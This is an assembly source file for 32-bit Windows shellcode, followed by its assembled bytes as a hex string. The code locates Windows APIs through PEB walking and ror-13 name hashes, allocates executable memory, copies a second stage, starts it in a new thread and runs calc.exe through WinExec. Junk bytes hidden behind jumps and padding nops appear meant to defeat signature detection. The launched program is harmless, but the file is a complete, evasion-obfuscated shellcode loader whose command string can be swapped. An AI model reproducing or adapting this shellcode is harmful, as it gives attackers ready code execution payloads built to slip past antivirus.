;; nasm -f win32 command_shellcodex86.asm
;; C:\ProgramFiles\x86\c\bin\gcc.exe -m32 -o command_shellcodex86.exe command_shellcodex86.obj

section .text
global _main

_main:
                nop
                nop
                pusha
                pushf
                cld
                nop
                call   call_1
                pusha
                mov    ebp, esp
                xor    edx, edx
                nop
                mov    edx, [fs:0x30]
                mov    edx, [edx+0xc]
                mov    edx, [edx+0x14]
                jmp    call_2
            db  0x72, 0x28
       call_2:  mov    esi, [edx+0x28]
                xor    ecx, ecx
                mov    cx, [edx+0x26]
                xor    edi, edi
       call_4:  xor    eax, eax
                lodsb
                cmp    al, 0x61
                jl     call_3
                sub    al, 0x20
       call_3:  ror    edi, 0xd
                add    edi, eax
                dec    ecx
                jne    call_4
                push   edx
                nop
                push   edi
                mov    edx, [edx+0x10]
                nop
                mov    eax, [edx+0x3c]
                add    eax, edx
                nop
                mov    eax, [eax+0x78]
                jmp    call_5
            db  0xeb, 0x07, 0xea, 0x48, 0x42, 0x04, 0x85, 0x7c, 0x3a
       call_5:  test   eax, eax
                je     call_6
                nop
                add    eax, edx
                push   eax
                nop
                mov    ecx, [eax+0x18]
                mov    ebx, [eax+0x20]
                add    ebx, edx
      call_11:  jecxz  call_7
                dec    ecx
                mov    esi, [ebx+ecx*4]
                add    esi, edx
                xor    edi, edi
      call_10:  nop
                xor    eax, eax
                jmp    call_9
            db  0xff, 0x69, 0xd5, 0x38, 0x0d, 0xcf
       call_9:  lodsb
                ror    edi, 0xd
                add    edi, eax
                cmp    al, ah
                jmp    call_8
            db  0x7f, 0x1b, 0xd2, 0xeb, 0x03
       call_8:  jne    call_10
                add    edi, [ebp-0x8]
                cmp    edi, [ebp+0x24]
                jne    call_11
                pop    eax
                nop
                mov    ebx, [eax+0x24]
                add    ebx, edx
                nop
                mov    cx, [ebx+ecx*2]
                mov    ebx, [eax+0x1c]
                add    ebx, edx
                nop
                jmp    call_12
            db  0xcd, 0x97, 0xf1, 0xb1
      call_12:  mov    eax, [ebx+ecx*4]
                add    eax, edx
                nop
                mov    [esp+0x24], eax
                pop    ebx
                pop    ebx
                popa
                nop
                pop    ecx
                pop    edx
                push   ecx
                jmp    call_13
            db  0x0f
      call_13:  jmp    eax
       call_7:  pop    eax
       call_6:  nop
                pop    edi
                pop    edx
                mov    edx, [edx]
                jmp    call_2
       call_1:  nop
                pop    ebp
                nop
                mov    esi, 0xc6
                nop
                push   0x40
                nop
                push   0x1000
                push   esi
                nop
                push   0x0
                push   0xe553a458
                call   ebp
                mov    ebx, eax
                mov    edi, eax
                nop
                mov    ecx, esi
                jmp    call_14
      call_15:  nop
                pop    esi
                nop
                nop
                nop
                repnz movsb
                call   call_18
                mov    ebx, 0xa2a1de0
                nop
                push   0x9dbd95a6
                call   ebp
                cmp    al, 0x6
                jl     call_19
                cmp    bl, 0xe0
                jne    call_19
                mov    ebx, 0x6f721347
      call_19:  push   0x0
                push   ebx
                call   ebp
      call_18:  xor    eax, eax
                push   eax
                push   eax
                push   eax
                push   ebx
                push   eax
                push   eax
                push   0x160d6838
                call   ebp
                pop    eax
                pop    eax
                nop
                popa
                jmp    call_16                      ;; EIP for CreateThread is here
      call_14:  call   call_15
      call_16:  cld
                call   call_17
                pusha
                mov    ebp, esp
                xor    eax, eax
                mov    edx, [fs:eax+0x30]
                mov    edx, [edx+0xc]
                mov    edx, [edx+0x14]
      call_26:  mov    esi, [edx+0x28]
                xor    ecx, ecx
                mov    cx, [edx+0x26]
                xor    edi, edi
      call_21:  lodsb
                cmp    al, 0x61
                jl     call_20
                sub    al, 0x20
      call_20:  ror    edi, 0xd
                add    edi, eax
                loop   call_21
                push   edx
                push   edi
                mov    edx, [edx+0x10]
                mov    ecx, [edx+0x3c]
                mov    ecx, [ecx+edx*1+0x78]
                jecxz  call_22
                add    ecx, edx
                push   ecx
                mov    ebx, [ecx+0x20]
                add    ebx, edx
                mov    ecx, [ecx+0x18]
      call_25:  jecxz  call_23
                dec    ecx
                mov    esi, [ebx+ecx*4]
                add    esi, edx
                xor    edi, edi
      call_24:  lodsb
                ror    edi, 0xd
                add    edi, eax
                cmp    al, ah
                jne    call_24
                add    edi, [ebp-0x8]
                cmp    edi, [ebp+0x24]
                jne    call_25
                pop    eax
                mov    ebx, [eax+0x24]
                add    ebx, edx
                mov    cx, [ebx+ecx*2]
                mov    ebx, [eax+0x1c]
                add    ebx, edx
                mov    eax, [ebx+ecx*4]
                add    eax, edx
                mov    [esp+0x24], eax
                pop    ebx
                pop    ebx
                popa
                pop    ecx
                pop    edx
                push   ecx
                jmp    eax                          ;; call WinExec
      call_23:  pop    edi
      call_22:  pop    edi
                pop    edx
                mov    edx, [edx]
                jmp    call_26
      call_17:  pop    ebp
                push   0x1
                lea    eax, [ebp+0xb6]
                push   eax
                push   0x876f8b31
                call   ebp
                mov    ebx, 0x5de2c5aa
                push   0x9dbd95a6
                call   ebp
                cmp    al, 0x6
                jl     call_27
                cmp    bl, 0xe0
                jne    call_27
                mov    ebx, 0x6f721347
      call_27:  push   0x0
                push   ebx
                call   ebp
                jmp    call_28
            db  0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
      call_28:

;; 9090609cfc90e8c60000006089e531d290648b15300000008b520c8b5214eb0272288b722831c9668b4a2631ff31c0ac3c617c022c20c1cf0d01c74975ef5290578b5210908b423c01d0908b4078eb09eb07ea484204857c3a85c0746a9001d050908b48188b582001d3e35a498b348b01d631ff9031c0eb06ff69d5380dcfacc1cf0d01c738e0eb057f1bd2eb0375e4037df83b7d2475d258908b582401d390668b0c4b8b581c01d390eb04cd97f1b18b048b01d090894424245b5b6190595a51eb010fffe058905f5a8b12e951ffffff905d90bec6000000906a4090680010000056906a006858a453e5ffd589c389c79089f1eb41905e909090f2a4e820000000bbe01d2a0a9068a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd531c05050505350506838680d16ffd558589061eb05e8bafffffffce8840000006089e531c0648b50308b520c8b52148b722831c9668b4a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8b5d6a018d85b90000005068318b6f87ffd5bbaac5e25d68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5e90900000063616c632e65786500